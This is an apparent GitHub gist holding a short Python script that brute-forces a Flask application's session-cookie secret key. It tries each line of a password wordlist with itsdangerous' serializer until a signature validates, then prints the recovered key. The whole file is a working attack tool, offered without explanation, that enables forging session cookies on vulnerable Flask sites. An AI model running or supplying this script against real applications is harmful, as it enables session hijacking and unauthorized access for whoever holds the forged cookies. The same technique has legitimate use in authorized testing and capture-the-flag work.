#date: 2022-06-03T17:00:50Z
#url: https://api.github.com/gists/c9aef843ad217a7d54112696847e50fa
#owner: https://api.github.com/users/kavishkagihan

from flask.json.tag import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer, TimestampSigner
import hashlib
from itsdangerous.exc import BadSignature

cookie = ""

wordlist = open('/usr/share/wordlists/fasttrack.txt').readlines()

for secret in wordlist:
	try:
		serializer = URLSafeTimedSerializer(
            secret_key=secret.strip(),
            salt='cookie-session',
            serializer=TaggedJSONSerializer(),
            signer=TimestampSigner,
            signer_kwargs={
                'key_derivation' : 'hmac',
                'digest_method' : hashlib.sha1
            }
        ).loads(cookie)
	except BadSignature:
		continue

	print("Key : " + secret)
	break